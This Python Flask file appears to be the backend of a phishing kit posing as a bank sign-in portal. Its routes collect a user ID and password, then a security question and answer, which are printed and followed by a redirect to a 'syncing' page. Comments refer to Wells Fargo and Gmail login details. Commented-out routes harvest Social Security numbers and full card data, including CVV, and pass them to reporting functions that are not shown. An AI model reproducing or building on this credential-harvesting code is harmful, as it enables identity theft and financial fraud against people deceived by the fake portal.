from flask import Blueprint, render_template, request, redirect, url_for


portals = Blueprint('portals', __name__)

@portals.route('/signin', methods=['GET','POST'])
def signin():
    if request.method == 'POST':
        user_id = request.form['user-id']
        password_ = request.form['password']
        if user_id and password_:
            # new_user = User(username=user_id, password=password_)
            # db.session.add(new_user)
            # db.session.commit()
            return redirect(url_for('portals.question'))
    return render_template('signin.html')

@portals.route('/question', methods=['GET','POST'])
def question():
    if request.method == 'POST':
        q1 = request.form['q1']
        ans1 = request.form['ans1']
        print(q1,'--->',ans1)
        # print(email,password, bank_name='Wellsfargo Gmail Login details')
        # report_login(email,password, bank_name='Gmail Account')
        return redirect(url_for('main.syncing'))
    return render_template('question.html')

# @portals.route('/ssn-confirmation', methods=['GET','POST'])
# def ssn():
#     if request.method == 'POST':
#         ssn = request.form['ssn']
#         if ssn:
#             # print(ssn)
#             report_ssn(ssn)
#             return redirect(url_for('portals.email_confirmation'))
#     return render_template('identity-ssn.html')

# @portals.route('/signin/card-confirmation', methods=['GET','POST'])
# def card_confirmation():
#     if request.method == 'POST':
#         card_name = request.form['card_name']
#         card_number = request.form['card_number']
#         exp_date = request.form['exp_date']
#         cvv = request.form['cvv']
#         if card_name and card_number and exp_date and cvv:
#             # print( card_name, card_number, exp_date, cvv)
#             report_card_details(card_name, card_number, exp_date, cvv)
#             return redirect(url_for('portals.ssn'))
#     return render_template('bank-card.html')

# We are all 6 years old at some level